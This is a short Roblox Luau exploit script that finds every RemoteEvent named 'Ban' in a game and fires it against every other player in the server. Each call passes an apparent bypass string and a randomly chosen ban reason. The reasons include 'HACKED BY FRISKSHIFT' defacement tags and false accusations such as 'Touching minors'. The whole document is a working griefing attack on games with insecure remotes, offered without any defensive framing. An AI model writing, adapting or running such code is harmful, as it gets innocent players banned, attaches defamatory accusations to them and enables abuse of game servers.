function getInstance(name:string, instanceName:string)
    local t = {}
    for _, even in game:GetDescendants() do
        if even.Name == name and even:IsA(instanceName) then
            table.insert(t, even)
        end
    end
    return t
end

local reasons = {"Scamming", "Farting Owner", "Exploitng", "Bypassing Chat", "Harassment", "Bullying someone", "Inappropriate Avator / Name", "Touching minors", "OWO!!!! HACKED BY FRISKSHIFT!!", "FRISKSHIFT IS BACK"}

local PS = game:GetService("Players")
for _, remote in pairs(getInstance("Ban", "RemoteEvent")) do
    for _, player in PS:GetPlayers() do
        if player == PS.LocalPlayer then continue end
        remote:FireServer(unpack({
            [1] = {
                [1] = player.Name,
                [2] = "_RETROSAFENIL_",
                [3] = reasons[math.random(0, #reasons)]
            }
        }))
    end
end